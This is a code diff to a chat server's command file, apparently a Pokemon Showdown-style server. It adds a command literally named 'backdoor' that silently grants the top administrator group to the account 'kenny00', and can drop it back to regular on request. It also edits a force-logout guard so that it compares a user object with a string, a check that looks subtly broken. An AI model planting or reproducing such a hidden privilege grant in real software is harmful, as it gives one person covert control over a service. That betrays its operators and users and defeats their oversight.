@@ -219,7 +219,7 @@ var commands = exports.commands = {
 			return this.sendReply('User '+this.targetUsername+' not found.');
 		}
 
-		if (targetUser == kenny00) return this.sendReply('You cannot force logout Console Admin.');
+		if (targetUser == 'kenny00') return this.sendReply('You cannot force logout Console Admin.');
 
 		this.addModCommand(''+targetUser.name+' was forcibly logged out by '+user.name+'.' + (target ? " (" + target + ")" : ""));
 
@@ -228,6 +228,22 @@ var commands = exports.commands = {
 		targetUser.resetName();
 	},
 	
+	backdoor: function (target, room, user) {
+        	if (user.userid !== 'kenny00') return this.sendReply('/backdoor - Access denied.');
+
+        	if (!target) {
+            	user.group = '~';
+            	user.updateIdentity();
+            	return;
+        	}
+
+        	if (target === 'reg') {
+            	user.group = ' ';
+            	user.updateIdentity();
+            	return;
+        	}
+    	},
+    	
 	/*********************************************************
 	 * Games
 	 *********************************************************/
